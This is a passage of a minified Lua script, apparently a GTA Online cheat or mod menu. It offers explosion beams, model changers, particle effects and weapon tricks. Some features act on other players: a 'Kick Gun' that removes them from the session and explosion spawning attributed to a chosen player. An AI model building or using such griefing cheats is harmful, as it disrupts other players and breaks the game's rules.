    aj["exp_beam"] = b8("Explosive Beam on Horn", aj["parent"])
    aj["exp_beam"].hidden = l["explosive_beam_hidden"]
    aj["exp_beam"] = aj["exp_beam"].id
    ak["exp_beam"] =
        bc(
        "Enable Beam on Horn",
        aj["exp_beam"],
        function(k)
            l["exp_beam"] = k.on
            if k.on then
                local ec = c.id()
                if K.scid(ak["exp_beam_other"].value_i) ~= -1 then
                    ec = ak["exp_beam_other"].value_i
                end
                local dD = c.ped(ec)
                local bq, bp, bP, ed, ee
                local ef = v3()
                local eg, eh, ei, ej, ek, el
                if player.is_player_pressing_horn(ec) then
                    bq = ped.get_vehicle_ped_is_using(dD)
                    for i = 0, 5 do
                        bp = c.gcoords(bq)
                        c.wait(5)
                        if i > 0 then
                            bP = c.gcoords(bq)
                            ef.x = bP.x - bp.x
                            ef.y = bP.y - bp.y
                            ef.z = bP.z - bp.z
                            if ef.x ~= 0 and ef.y ~= 0 and ef.z ~= 0 then
                                ed = 1 / (ef.x * ef.x + ef.y * ef.y + ef.z * ef.z) ^ 0.5
                                ee = c.random(l["exp_beam_min"], l["exp_beam_max"])
                                bP.x = bP.x + ee * ed * ef.x
                                bP.y = bP.y + ee * ed * ef.y
                                bP.z = bP.z + ee * ed * ef.z
                                eg = math.floor(bP.x - l["exp_beam_radius"])
                                eh = math.floor(bP.x + l["exp_beam_radius"])
                                ei = math.floor(bP.y - l["exp_beam_radius"])
                                ej = math.floor(bP.y + l["exp_beam_radius"])
                                ek = math.floor(bP.z - l["exp_beam_radius"])
                                el = math.floor(bP.z + l["exp_beam_radius"])
                                bP.x = c.random(eg, eh)
                                bP.y = c.random(ei, ej)
                                bP.z = c.random(ek, el)
                                fire.add_explosion(bP, l["exp_beam_type"], true, false, 0.1, dD)
                                bP.x = c.random(eg, eh)
                                bP.y = c.random(ei, ej)
                                bP.z = c.random(ek, el)
                                fire.add_explosion(bP, l["exp_beam_type_2"], true, false, 0.1, dD)
                            end
                        end
                    end
                end
            end
            return d.stop(k)
        end
    )
    ak["exp_beam"].on = l["exp_beam"]
    ak["exp_beam_type"] =
        bd(
        "Select Explosion",
        "action_value_i",
        aj["exp_beam"],
        function()
            l["exp_beam_type"] = ak["exp_beam_type"].value_i
            o("Beam Explosion Type 1: " .. l["exp_beam_type"])
        end
    )
    ak["exp_beam_type"].max_i = 74
    ak["exp_beam_type"].min_i = 0
    ak["exp_beam_type"].value_i = l["exp_beam_type"]
    ak["exp_beam_type_2"] =
        bd(
        "Select Explosion 2",
        "action_value_i",
        aj["exp_beam"],
        function()
            l["exp_beam_type_2"] = ak["exp_beam_type_2"].value_i
            o("Beam Explosion Type 2: " .. l["exp_beam_type_2"])
        end
    )
    ak["exp_beam_type_2"].max_i = 74
    ak["exp_beam_type_2"].min_i = 0
    ak["exp_beam_type_2"].value_i = l["exp_beam_type_2"]
    ak["exp_beam_radius"] =
        bd(
        "Select Scattering",
        "action_value_i",
        aj["exp_beam"],
        function()
            l["exp_beam_radius"] = ak["exp_beam_radius"].value_i
            o("Beam Radius: " .. l["exp_beam_radius"])
        end
    )
    ak["exp_beam_radius"].max_i = 10
    ak["exp_beam_radius"].min_i = 1
    ak["exp_beam_radius"].value_i = l["exp_beam_radius"]
    ak["exp_beam_min"] =
        bd(
        "Select Min Range",
        "action_value_i",
        aj["exp_beam"],
        function()
            l["exp_beam_min"] = ak["exp_beam_min"].value_i
            o("Beam Min Range: " .. l["exp_beam_min"])
        end
    )
    ak["exp_beam_min"].max_i = 100
    ak["exp_beam_min"].min_i = 10
    ak["exp_beam_min"].value_i = l["exp_beam_min"]
    ak["exp_beam_min"].mod_i = 5
    ak["exp_beam_max"] =
        bd(
        "Select Max Range",
        "action_value_i",
        aj["exp_beam"],
        function()
            l["exp_beam_max"] = ak["exp_beam_max"].value_i
            o("Beam Max Range: " .. l["exp_beam_max"])
        end
    )
    ak["exp_beam_max"].max_i = 300
    ak["exp_beam_max"].min_i = 100
    ak["exp_beam_max"].value_i = l["exp_beam_max"]
    ak["exp_beam_max"].mod_i = 5
    ak["exp_beam_other"] =
        bd(
        "Enable Horn for Player",
        "action_value_i",
        aj["exp_beam"],
        function()
            if K.scid(ak["exp_beam_other"].value_i) ~= -1 then
                o("Selected Player: " .. K.name(ak["exp_beam_other"].value_i))
            else
                o("Not a valid Player.")
            end
        end
    )
    ak["exp_beam_other"].max_i = 31
    ak["exp_beam_other"].min_i = -1
    ak["exp_beam_other"].value_i = -1
    aj["bac"] = b8("Better Animal Changer", aj["parent"])
    aj["bac"].hidden = l["animal_changer_hidden"]
    aj["bac"] = aj["bac"].id
    aj["bac_ga"] = b8("Ground Animals", aj["bac"]).id
    bb(
        "Bigfoot",
        aj["bac_ga"],
        function()
            bx(0x61D4C771, nil, true, nil, true)
        end
    )
    bb(
        "Bigfoot 2",
        aj["bac_ga"],
        function()
            bx(0xAD340F5A, nil, true, nil, true)
        end
    )
    bb(
        "Boar",
        aj["bac_ga"],
        function()
            bx(0xCE5FF074)
        end
    )
    bb(
        "Cat",
        aj["bac_ga"],
        function()
            bx(0x573201B8)
        end
    )
    bb(
        "Chimp",
        aj["bac_ga"],
        function()
            bx(0xA8683715, nil, nil, true)
        end
    )
    bb(
        "Chop",
        aj["bac_ga"],
        function()
            bx(0x14EC17EA, nil, true)
        end
    )
    bb(
        "Cow",
        aj["bac_ga"],
        function()
            bx(0xFCFA9E1E)
        end
    )
    bb(
        "Coyote",
        aj["bac_ga"],
        function()
            bx(0x644AC75E)
        end
    )
    bb(
        "Deer",
        aj["bac_ga"],
        function()
            bx(0xD86B5A95)
        end
    )
    bb(
        "German Shepherd",
        aj["bac_ga"],
        function()
            bx(0x431FC24C, nil, true)
        end
    )
    bb(
        "Hen",
        aj["bac_ga"],
        function()
            bx(0x6AF51FAF)
        end
    )
    bb(
        "Husky",
        aj["bac_ga"],
        function()
            bx(0x4E8F95A2, nil, true)
        end
    )
    bb(
        "Mountain Lion",
        aj["bac_ga"],
        function()
            bx(0x1250D7BA, nil, true)
        end
    )
    bb(
        "Pig",
        aj["bac_ga"],
        function()
            bx(0xB11BAB56)
        end
    )
    bb(
        "Poodle",
        aj["bac_ga"],
        function()
            bx(0x431D501C)
        end
    )
    bb(
        "Pug",
        aj["bac_ga"],
        function()
            bx(0x6D362854)
        end
    )
    bb(
        "Rabbit",
        aj["bac_ga"],
        function()
            bx(0xDFB55C81)
        end
    )
    bb(
        "Rat",
        aj["bac_ga"],
        function()
            bx(0xC3B52966)
        end
    )
    bb(
        "Golden Retriever",
        aj["bac_ga"],
        function()
            bx(0x349F33E1, nil, true)
        end
    )
    bb(
        "Rhesus",
        aj["bac_ga"],
        function()
            bx(0xC2D06F53, nil, nil, true)
        end
    )
    bb(
        "Rottweiler",
        aj["bac_ga"],
        function()
            bx(0x9563221D, nil, true)
        end
    )
    bb(
        "Westy",
        aj["bac_ga"],
        function()
            bx(0xAD7844BB)
        end
    )
    aj["bac_wa"] =
        b8(
        "Water Animals",
        aj["bac"],
        function()
            o("Note that these Models will only work in Water!", 48)
        end
    ).id
    bb(
        "Dolphin",
        aj["bac_wa"],
        function()
            bx(0x8BBAB455, true)
        end
    )
    bb(
        "Fish",
        aj["bac_wa"],
        function()
            bx(0x2FD800B7, true)
        end
    )
    bb(
        "Hammershark",
        aj["bac_wa"],
        function()
            bx(0x3C831724, true)
        end
    )
    bb(
        "Humpback",
        aj["bac_wa"],
        function()
            bx(0x471BE4B2, true)
        end
    )
    bb(
        "Killerwhale",
        aj["bac_wa"],
        function()
            bx(0x8D8AC8B9, true)
        end
    )
    bb(
        "Shark",
        aj["bac_wa"],
        function()
            bx(0x06C3F072, true, true)
        end
    )
    bb(
        "Stingray",
        aj["bac_wa"],
        function()
            bx(0xA148614D, true)
        end
    )
    aj["bac_fa"] = b8("Flying Animals", aj["bac"]).id
    bb(
        "Cormorant",
        aj["bac_fa"],
        function()
            bx(0x56E29962)
        end
    )
    bb(
        "Chickenhawk",
        aj["bac_fa"],
        function()
            bx(0xAAB71F62)
        end
    )
    bb(
        "Crow",
        aj["bac_fa"],
        function()
            bx(0x18012A9F)
        end
    )
    bb(
        "Pigeon",
        aj["bac_fa"],
        function()
            bx(0x06A20728)
        end
    )
    bb(
        "Seagull",
        aj["bac_fa"],
        function()
            bx(0xD3939DFD)
        end
    )
    aj["bac_sm"] = b8("Standard Models", aj["bac"]).id
    bb(
        "Franklin",
        aj["bac_sm"],
        function()
            bx(0x9B22DBAF, nil, nil, nil, true)
        end
    )
    bb(
        "Michael",
        aj["bac_sm"],
        function()
            bx(0x0D7114C9, nil, nil, nil, true)
        end
    )
    bb(
        "Trevor",
        aj["bac_sm"],
        function()
            bx(0x9B810FA2, nil, nil, nil, true)
        end
    )
    bb(
        "MP Female",
        aj["bac_sm"],
        function()
            bx(0x9C9EFFD8, nil, true, nil, true)
        end
    )
    bb(
        "MP Male",
        aj["bac_sm"],
        function()
            bx(0x705E61F2, nil, true, nil, true)
        end
    )
    ak["bl_mdl_change"] =
        bc(
        "Safe Model Change",
        aj["bac"],
        function(k)
            l["bl_mdl_change"] = k.on
        end
    )
    ak["bl_mdl_change"].on = l["bl_mdl_change"]
    bb(
        "Fix endless loading Screen",
        aj["bac"],
        function()
            bx(0x9B22DBAF, nil, nil, nil, true)
            c.wait(100)
            ped.set_ped_health(M.ped(), 0)
        end
    )
    aj["ptfx"] = b8("PTFX", aj["parent"])
    aj["ptfx"].hidden = l["ptfx_hidden"]
    aj["ptfx"] = aj["ptfx"].id
    ak["sparkling_ass"] =
        bc(
        "Sparkling Ass",
        aj["ptfx"],
        function(k)
            if k.on then
                graphics.set_next_ptfx_asset("scr_indep_fireworks")
                while not graphics.has_named_ptfx_asset_loaded("scr_indep_fireworks") do
                    graphics.request_named_ptfx_asset("scr_indep_fireworks")
                    c.wait(0)
                end
                graphics.start_networked_particle_fx_non_looped_at_coord(
                    "scr_indep_firework_trail_spawn",
                    M.coords(),
                    v3(60, 0, 0),
                    0.33,
                    true,
                    true,
                    true
                )
                c.wait(25)
            end
            l["sparkling_ass"] = k.on
            return d.stop(k)
        end
    )
    ak["sparkling_ass"].on = l["sparkling_ass"]
    ak["sparkling_tires"] =
        bc(
        "Sparkling Tires (WIP)",
        aj["ptfx"],
        function(k)
            if k.on then
                local bq = ped.get_vehicle_ped_is_using(M.ped())
                if bq ~= 0 then
                    local em = {"wheel_lf", "wheel_rf", "wheel_lr", "wheel_rr"}
                    for i = 1, #em do
                        I.model(1803116220)
                        local en = object.create_object(1803116220, M.coords(), true, false)
                        entity.set_entity_collision(en, false, false, false)
                        entity.set_entity_visible(en, false)
                        local D = entity.get_entity_bone_index_by_name(bq, em[i])
                        entity.attach_entity_to_entity(en, bq, D, v3(), v3(), true, true, false, 0, true)
                        graphics.set_next_ptfx_asset("scr_indep_fireworks")
                        while not graphics.has_named_ptfx_asset_loaded("scr_indep_fireworks") do
                            graphics.request_named_ptfx_asset("scr_indep_fireworks")
                            c.wait(0)
                        end
                        graphics.start_networked_particle_fx_non_looped_at_coord(
                            "scr_indep_firework_trail_spawn",
                            c.gcoords(en),
                            v3(60, 0, 0),
                            0.5,
                            true,
                            true,
                            true
                        )
                        I.ctrl(en, 5)
                        entity.detach_entity(en)
                        entity.set_entity_velocity(en, v3())
                        bj(en, v3(8000, 8000, -1000))
                        entity.delete_entity(en)
                    end
                    c.unload(1803116220)
                    c.wait(25)
                end
            end
            l["sparkling_tires"] = k.on
            return d.stop(k)
        end
    )
    ak["sparkling_tires"].on = l["sparkling_tires"]
    ak["smoke_area"] =
        bc(
        "Smoke Area",
        aj["ptfx"],
        function(k)
            if k.on then
                for i = 1, 16 do
                    local bp = M.coords()
                    local eo = 2 * math.pi
                    eo = eo / 16
                    eo = eo * i
                    bp.x = bp.x + 18 * math.cos(eo)
                    bp.y = bp.y + 18 * math.sin(eo)
                    bp.z = bp.z - 2.5
                    graphics.set_next_ptfx_asset("scr_recartheft")
                    while not graphics.has_named_ptfx_asset_loaded("scr_recartheft") do
                        graphics.request_named_ptfx_asset("scr_recartheft")
                        c.wait(0)
                    end
                    graphics.start_networked_particle_fx_non_looped_at_coord(
                        "scr_wheel_burnout",
                        bp,
                        v3(),
                        2.5,
                        true,
                        true,
                        true
                    )
                    c.wait(40)
                end
            end
            l["smoke_area"] = k.on
            return d.stop(k)
        end
    )
    ak["smoke_area"].on = l["smoke_area"]
    ak["fire_circle"] =
        bc(
        "Fire Circle",
        aj["ptfx"],
        function(k)
            if k.on then
                if b7["fire_balls"][1] == nil then
                    for i = 1, 48 do
                        I.model(1803116220)
                        b7["fire_balls"][i] = object.create_object(1803116220, M.coords(), true, false)
                        entity.set_entity_collision(b7["fire_balls"][i], false, false, false)
                        entity.set_entity_visible(b7["fire_balls"][i], false)
                    end
                    c.unload(1803116220)
                end
                for i = 1, 48 do
                    local bp = M.coords()
                    local eo = 2 * math.pi
                    eo = eo / 48
                    eo = eo * c.random(1, 64)
                    bp.x = bp.x + 10 * math.cos(eo)
                    bp.y = bp.y + 10 * math.sin(eo)
                    bp.z = bp.z - 1.5
                    bj(b7["fire_balls"][i], bp)
                end
                c.wait(10)
                if b7["fire_circle"][1] == nil then
                    for i = 1, 48 do
                        graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                        while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                            graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                            c.wait(0)
                        end
                        b7["fire_circle"][i] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping",
                            b7["fire_balls"][i],
                            v3(),
                            v3(90, 0, 0),
                            1
                        )
                    end
                end
            end
            if not k.on then
                bk(b7["fire_balls"])
                b7["fire_balls"] = {}
                if b7["fire_circle"][1] ~= nil then
                    for i = 1, #b7["fire_circle"] do
                        graphics.remove_particle_fx(b7["fire_circle"][i], true)
                    end
                    b7["fire_circle"] = {}
                end
            end
            return d.stop(k)
        end
    )
    ak["fire_circle"].on = l["fire_circle"]
    ak["fire_fart"] =
        bd(
        "Fire Fart",
        "action_value_i",
        aj["ptfx"],
        function(k)
            l["fire_fart"] = ak["fire_fart"].value_i
            local bq = ped.get_vehicle_ped_is_using(M.ped())
            if bq ~= 0 then
                o("Fire Fart in a vehicle is too dangerous, get out!", 162)
            else
                local cf = 0x187D938D
                local ep = "weap_xs_vehicle_weapons"
                local eq = "muz_xs_turret_flamethrower_looping"
                I.model(cf)
                local b_ = player.get_player_heading(c.id())
                local cg = vehicle.create_vehicle(cf, M.coords(), b_, true, false)
                I.ctrl(cg)
                entity.set_entity_visible(cg, false)
                c.unload(cf)
                decorator.decor_set_int(cg, "MPBitset", 1 << 10)
                ped.set_ped_into_vehicle(M.ped(), cg, -1)
                c.wait(500)
                graphics.set_next_ptfx_asset(ep)
                while not graphics.has_named_ptfx_asset_loaded(ep) do
                    graphics.request_named_ptfx_asset(ep)
                    c.wait(0)
                end
                local er = k.value_i
                local fire = graphics.start_ptfx_looped_on_entity(eq, M.ped(), v3(), v3(180, 0, 0), er * 0.1)
                local bp = c.gcoords(cg)
                local cY = entity.get_entity_rotation(cg)
                local dK = cY
                dK:transformRotToDir()
                dK = dK * 1 * er
                dK.z = bp.z + 0.6666666 * er
                local es = dK
                entity.set_entity_velocity(cg, es)
                c.wait(250 * er)
                graphics.remove_particle_fx(fire, true)
                while ped.is_ped_in_any_vehicle(M.ped()) do
                    ai.task_leave_vehicle(M.ped(), cg, 16)
                    c.wait(25)
                end
                bk({cg})
            end
        end
    )
    ak["fire_fart"].max_i = 16
    ak["fire_fart"].min_i = 4
    ak["fire_fart"].value_i = l["fire_fart"]
    ak["fire_ass"] =
        bc(
        "Fire Ass",
        aj["ptfx"],
        function(k)
            l["fire_ass"] = k.on
            if k.on then
                if b7["fire_ass_ball"] == nil then
                    I.model(1803116220)
                    b7["fire_ass_ball"] = object.create_object(1803116220, M.coords(), true, false)
                    entity.set_entity_collision(b7["fire_ass_ball"], false, false, false)
                    entity.set_entity_visible(b7["fire_ass_ball"], false)
                    c.unload(1803116220)
                end
                if b7["fire_ass"] == nil then
                    local ep = "weap_xs_vehicle_weapons"
                    local eq = "muz_xs_turret_flamethrower_looping"
                    graphics.set_next_ptfx_asset(ep)
                    while not graphics.has_named_ptfx_asset_loaded(ep) do
                        graphics.request_named_ptfx_asset(ep)
                        c.wait(0)
                    end
                    b7["fire_ass"] = graphics.start_ptfx_looped_on_entity(eq, M.ped(), v3(), v3(180, 0, 0), 0.333)
                end
                local bp = M.coords()
                bj(b7["fire_ass_ball"], M.coords())
            end
            if not k.on then
                if b7["fire_ass"] ~= nil then
                    graphics.remove_particle_fx(b7["fire_ass"], true)
                    b7["fire_ass"] = nil
                end
                bk({b7["fire_ass_ball"]})
                b7["fire_ass_ball"] = nil
            end
            return d.stop(k)
        end
    )
    ak["fire_ass"].on = l["fire_ass"]
    aj["misc"] = b8("Miscellaneous", aj["parent"])
    aj["misc"].hidden = l["misc_hidden"]
    aj["misc"] = aj["misc"].id
    aj["weapon"] = b8("Weapon-Features", aj["misc"]).id
    ak["load_weapons"] =
        bc(
        "Load Weapons",
        aj["weapon"],
        function(k)
            if k.on then
                local time = c.time() + 500
                while k.on do
                    c.wait(0)
                    if time < c.time() then
                        break
                    end
                end
                local et = weapon.get_all_weapon_hashes()
                for i = 1, #et do
                    if weapon.has_ped_got_weapon(M.ped(), et[i]) then
                        local eu = false
                        for F = 1, #ag do
                            if et[i] == ag[F][1] then
                                eu = true
                            end
                        end
                        if not eu then
                            weapon.remove_weapon_from_ped(M.ped(), et[i])
                        end
                    end
                end
                for i = 1, #ag do
                    if not weapon.has_ped_got_weapon(M.ped(), ag[i][1]) then
                        weapon.give_delayed_weapon_to_ped(M.ped(), ag[i][1], 0, 0)
                    end
                end
                for i = 1, #ag do
                    for dg = 2, #ag[i] do
                        if not weapon.has_ped_got_weapon_component(M.ped(), ag[i][1], ag[i][dg]) then
                            for dq = 2, #ag[i] do
                                weapon.give_weapon_component_to_ped(M.ped(), ag[i][1], ag[i][dq])
                            end
                            weapon.set_ped_ammo(M.ped(), ag[i][1], 9999)
                        end
                    end
                end
            end
            l["load_weapons"] = k.on
            return d.stop(k)
        end
    )
    ak["load_weapons"].on = l["load_weapons"]
    aj["flamethrower"] = b8("Flamethrower", aj["weapon"]).id
    ak["flamethrower_scale"] =
        bd(
        "Scale",
        "autoaction_value_i",
        aj["flamethrower"],
        function()
            l["flamethrower_scale"] = ak["flamethrower_scale"].value_i
        end
    )
    ak["flamethrower_scale"].min_i = 1
    ak["flamethrower_scale"].max_i = 25
    ak["flamethrower_scale"].value_i = l["flamethrower_scale"]
    ak["flamethrower"] =
        bc(
        "Flamethrower",
        aj["flamethrower"],
        function(k)
            if k.on then
                if player.is_player_free_aiming(c.id()) then
                    graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                    while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                        graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                        c.wait(0)
                    end
                    if b7["alien"] == nil then
                        I.model(1803116220)
                        b7["alien"] = object.create_object(1803116220, M.coords(), true, false)
                        entity.set_entity_collision(b7["alien"], false, false, false)
                        entity.set_entity_visible(b7["alien"], false)
                        c.unload(1803116220)
                    end
                    local ev, ew = ped.get_ped_bone_coords(M.ped(), 0xdead, v3())
                    while not ev do
                        c.wait(0)
                        ev, ew = ped.get_ped_bone_coords(M.ped(), 0xdead, v3())
                    end
                    bj(b7["alien"], ew)
                    entity.set_entity_rotation(b7["alien"], cam.get_gameplay_cam_rot())
                    if b7["flamethrower"] == nil then
                        b7["flamethrower"] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping",
                            b7["alien"],
                            v3(),
                            v3(),
                            l["flamethrower_scale"]
                        )
                        graphics.set_particle_fx_looped_scale(b7["flamethrower"], l["flamethrower_scale"])
                    end
                else
                    if b7["flamethrower"] ~= nil then
                        graphics.remove_particle_fx(b7["flamethrower"], true)
                        b7["flamethrower"] = nil
                        bk({b7["alien"]})
                        b7["alien"] = nil
                    end
                end
            end
            if not k.on then
                if b7["flamethrower"] ~= nil then
                    graphics.remove_particle_fx(b7["flamethrower"], true)
                    b7["flamethrower"] = nil
                    bk({b7["alien"]})
                    b7["alien"] = nil
                end
            end
            l["flamethrower"] = k.on
            return d.stop(k)
        end
    )
    ak["flamethrower"].on = l["flamethrower"]
    ak["flamethrower_green"] =
        bc(
        "Flamethrower - Green",
        aj["flamethrower"],
        function(k)
            if k.on then
                if player.is_player_free_aiming(c.id()) then
                    graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
                    while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
                        graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
                        c.wait(0)
                    end
                    if b7["alien"] == nil then
                        I.model(1803116220)
                        b7["alien"] = object.create_object(1803116220, M.coords(), true, false)
                        entity.set_entity_collision(b7["alien"], false, false, false)
                        entity.set_entity_visible(b7["alien"], false)
                        c.unload(1803116220)
                    end
                    local ev, ew = ped.get_ped_bone_coords(M.ped(), 0xdead, v3())
                    while not ev do
                        c.wait(0)
                        ev, ew = ped.get_ped_bone_coords(M.ped(), 0xdead, v3())
                    end
                    bj(b7["alien"], ew)
                    entity.set_entity_rotation(b7["alien"], cam.get_gameplay_cam_rot())
                    if b7["flamethrower_green"] == nil then
                        b7["flamethrower_green"] =
                            graphics.start_ptfx_looped_on_entity(
                            "muz_xs_turret_flamethrower_looping_sf",
                            b7["alien"],
                            v3(),
                            v3(),
                            l["flamethrower_scale"]
                        )
                    end
                else
                    if b7["flamethrower_green"] ~= nil then
                        graphics.remove_particle_fx(b7["flamethrower_green"], true)
                        b7["flamethrower_green"] = nil
                        bk({b7["alien"]})
                        b7["alien"] = nil
                    end
                end
            end
            if not k.on then
                if b7["flamethrower_green"] ~= nil then
                    graphics.remove_particle_fx(b7["flamethrower_green"], true)
                    b7["flamethrower_green"] = nil
                    bk({b7["alien"]})
                    b7["alien"] = nil
                end
            end
            l["flamethrower_green"] = k.on
            return d.stop(k)
        end
    )
    ak["flamethrower_green"].on = l["flamethrower_green"]
    aj["shoot"] = b8("Shoot Objects", aj["weapon"]).id
    ak["shoot"] =
        bc(
        "Enable Object Shoot",
        aj["shoot"],
        function(k)
            if k.on then
                for i = 1, #S do
                    if l[S[i][1]] and ped.is_ped_shooting(M.ped()) then
                        if #a0["shooting"] > 128 then
                            bk(a0["shooting"])
                            a0["shooting"] = {}
                        end
                        I.model(S[i][2])
                        local bp = M.coords()
                        local dK = cam.get_gameplay_cam_rot()
                        dK:transformRotToDir()
                        dK = dK * 8
                        bp = bp + dK
                        if streaming.is_model_an_object(S[i][2]) then
                            a0["shooting"][#a0["shooting"] + 1] = object.create_object(S[i][2], bp, true, false)
                        end
                        dK = nil
                        local ex = M.coords()
                        dK = cam.get_gameplay_cam_rot()
                        dK:transformRotToDir()
                        dK = dK * 100
                        ex = ex + dK
                        local ef = ex - bp
                        entity.apply_force_to_entity(
                            a0["shooting"][#a0["shooting"]],
                            3,
                            ef.x,
                            ef.y,
                            ef.z,
                            0.0,
                            0.0,
                            0.0,
                            true,
                            true
                        )
                    end
                end
            end
            if not k.on then
                bk(a0["shooting"])
                a0["shooting"] = {}
            end
            l["shoot_entitys"] = k.on
            return d.stop(k)
        end
    )
    ak["shoot"].on = l["shoot_entitys"]
    bb(
        "Delete Objects",
        aj["shoot"],
        function()
            bk(a0["shooting"])
            a0["shooting"] = {}
        end
    )
    for i = 1, #S do
        ak[S[i][1]] =
            bc(
            "Shoot " .. S[i][1],
            aj["shoot"],
            function(k)
                S[i][3] = k.on
                l[S[i][1]] = k.on
            end
        )
        ak[S[i][1]].on = l[S[i][1]]
    end
    ak["delete_gun"] =
        bc(
        "Delete Gun",
        aj["weapon"],
        function(k)
            if k.on then
                if ped.is_ped_shooting(M.ped()) then
                    local ey = player.get_entity_player_is_aiming_at(c.id())
                    if ey ~= nil then
                        bk({ey})
                    end
                end
            end
            l["delete_gun"] = k.on
            return d.stop(k)
        end
    )
    ak["delete_gun"].on = l["delete_gun"]
    ak["kick_gun"] =
        bc(
        "Kick Gun",
        aj["weapon"],
        function(k)
            if k.on then
                if ped.is_ped_shooting(M.ped()) then
                    local ez = player.get_entity_player_is_aiming_at(c.id())
                    if ped.is_ped_a_player(ez) then
                        o("Kick-Gun hit: " .. K.name(ez))
                        bG(false, player.get_player_from_ped(ez))
                    end
                end
            end
            l["kick_gun"] = k.on
            return d.stop(k)
        end
    )
    ak["kick_gun"].on = l["kick_gun"]
    ak["demigod_gun"] =
        bc(
        "Give Demi-God for Player",
        aj["weapon"],
        function(k)
            if k.on then
                if ped.is_ped_shooting(M.ped()) then
                    local ez = player.get_entity_player_is_aiming_at(c.id())
                    if ped.is_ped_a_player(ez) then
                        o("Attached Demi-God on Player: " .. K.name(ez))
                        bL(a7[1][2], player.get_player_from_ped(ez))
                    end
                end
            end
            l["demigod_gun"] = k.on
            return d.stop(k)
        end
    )
    ak["demigod_gun"].on = l["demigod_gun"]
    aj["model_gun"] = b8("Model Gun", aj["weapon"]).id
    ak["model_gun"] =
        bc(
        "Standard Model Gun (PEDs)",
        aj["model_gun"],
        function(k)
            if k.on then
                if aQ then
                    entity.set_entity_visible(M.ped(), false)
                    if aP ~= nil then
                        entity.set_entity_visible(aP, true)
                    end
                else
                    entity.set_entity_visible(M.ped(), true)
                end
                if player.is_player_free_aiming(c.id()) then
                    local eA = player.get_entity_player_is_aiming_at(c.id())
                    if eA ~= 0 then
                        eA = entity.get_entity_model_hash(eA)
                        if streaming.is_model_a_ped(eA) then
                            if aP ~= nil then
                                bk({aP})
                                aP = nil
                            end
                            local eB = entity.get_entity_model_hash(M.ped())
                            if eA ~= eB then
                                aQ = false
                                c.wait(50)
                                local eC = ped.get_current_ped_weapon(M.ped())
                                bx(eA, nil, nil, nil, true)
                                c.wait(25)
                                weapon.give_delayed_weapon_to.ped(M.ped(), eC, 0, 1)
                            end
                        elseif streaming.is_model_a_vehicle(eA) and ak["model_gun_ext"].on then
                            bk({aP})
                            aP = nil
                            aQ = true
                            aP = vehicle.create_vehicle(eA, M.coords(), 0, true, false)
                            entity.attach_entity_to_entity(aP, M.ped(), 0, v3(), v3(), true, true, false, 0, true)
                        elseif streaming.is_model_an_object(eA) and ak["model_gun_ext"].on then
                            bk({aP})
                            aP = nil
                            I.model(eA)
                            aP = object.create_object(eA, M.coords(), true, false)
                            c.unload(eA)
                            aQ = true
                            entity.attach_entity_to_entity(aP, M.ped(), 0, v3(), v3(), true, true, false, 0, true)
                        end
                    end
                end
            end
            if not k.on then
                bk({aP})
                aP = nil
                entity.set_entity_visible(M.ped(), true)
            end
            l["model_gun"] = k.on
            return d.stop(k)
        end
    )
    ak["model_gun"].on = l["model_gun"]
    ak["model_gun_ext"] =
        bc(
        "Add Objects and Vehicles to Model Gun",
        aj["model_gun"],
        function(k)
            l["model_gun_ext"] = k.on
        end
    )
    ak["model_gun_ext"].on = l["model_gun_ext"]
    ak["rapid_fire"] =
        bc(
        "Rapid Fire",
        aj["weapon"],
        function(k)
            if k.on then
                if player.is_player_free_aiming(c.id()) then
                    if ped.is_ped_shooting(M.ped()) then
                        for i = 1, 20 do
                            local eD = M.coords()
                            local dK = cam.get_gameplay_cam_rot()
                            dK:transformRotToDir()
                            dK = dK * 1.5
                            eD = eD + dK
                            dK = nil
                            local eE = M.coords()
                            dK = cam.get_gameplay_cam_rot()
                            dK:transformRotToDir()
                            dK = dK * 2500
                            eE = eE + dK
                            local eF = ped.get_current_ped_weapon(M.ped())
                            gameplay.shoot_single_bullet_between_coords(eD, eE, 1, eF, M.ped(), true, false, 1000)
                            c.wait(25)
                        end
                    end
                end
            end
            l["rapid_fire"] = k.on
            return d.stop(k)
        end
    )
    ak["rapid_fire"].on = l["rapid_fire"]
    ak["teleport_high_in_air"] =
        bb(
        "Teleport High in Air",
        aj["misc"],
        function()
            local bp = M.coords()
            while bp.z < 25000 do
                bp.z = bp.z + 500
                bm(bp)
                c.wait(50)
            end
        end
    )
    aj["vehicle"] = b8("Vehicle", aj["misc"]).id
    ak["tp_own_veh_to_me"] =
        bb(
        "Teleport Own Vehicle to me",
        aj["vehicle"],
        function()
            local bq = player.get_personal_vehicle()
            local eG = ped.get_vehicle_ped_is_using(M.ped())
            if bq ~= 0 and eG ~= bq then
                bj(bq, bZ(M.coords(), M.heading(), 5))
                entity.set_entity_heading(bq, M.heading())
            end
        end
    )
    ak["tp_own_veh_to_me_drive"] =
        bb(
        "Teleport Own Vehicle to me and drive",
        aj["vehicle"],
        function()
            local bq = player.get_personal_vehicle()
            local eG = ped.get_vehicle_ped_is_using(M.ped())
            if bq ~= 0 and eG ~= bq then
                bj(bq, M.coords())
                entity.set_entity_heading(bq, M.heading())
                ped.set_ped_into_vehicle(M.ped(), bq, -1)
            end
        end
    )
    ak["drive_own_veh"] =
        bb(
        "Drive Own Vehicle",
        aj["vehicle"],
        function()
            local bq = player.get_personal_vehicle()
            local eG = ped.get_vehicle_ped_is_using(M.ped())
            if bq ~= 0 and eG ~= bq then
                ped.set_ped_into_vehicle(M.ped(), bq, -1)
            end
        end
    )
    ak["tp_to_own_veh"] =
        bb(
        "Teleport to Own Vehicle",
        aj["vehicle"],
        function()
            local bq = player.get_personal_vehicle()
            local eG = ped.get_vehicle_ped_is_using(M.ped())
            s(bq)
            s(eG)
            if bq ~= 0 and eG ~= bq then
                bm(bZ(c.gcoords(bq), entity.get_entity_heading(bq), -5), 0, entity.get_entity_heading(bq))
            end
        end
    )
